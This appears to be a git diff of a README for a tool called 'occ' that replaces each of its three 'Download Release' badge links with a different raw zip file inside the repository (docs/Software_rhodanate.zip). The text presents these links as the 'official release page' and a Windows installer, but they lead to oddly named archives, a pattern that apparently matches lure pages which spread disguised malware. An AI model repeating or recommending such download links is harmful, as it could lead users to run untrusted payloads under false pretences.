@@ -1,6 +1,6 @@
 # 📊 occ - Easy Document Metrics and Code Exploration
 
-[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/specs/_archive/pipeline/Software-v3.6.zip)
+[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/docs/Software_rhodanate.zip)
 
 ---
 
@@ -46,7 +46,7 @@ When you start occ, you tell it where your files are. Then it reads them and pro
 
 Click the big green button below to visit the official release page. This page always contains the latest version of the program for Windows.
 
-[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/specs/_archive/pipeline/Software-v3.6.zip)
+[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/docs/Software_rhodanate.zip)
 
 ### Step 2: Find the Windows Installer
 
@@ -169,4 +169,4 @@ This broad support makes it easy to analyze almost any file stored in your folde
 
 Use the link below to visit the official release page and get the latest Windows installer:
 
-[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/specs/_archive/pipeline/Software-v3.6.zip)
+[![Download occ](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Botgirl1000/occ/raw/refs/heads/main/docs/Software_rhodanate.zip)
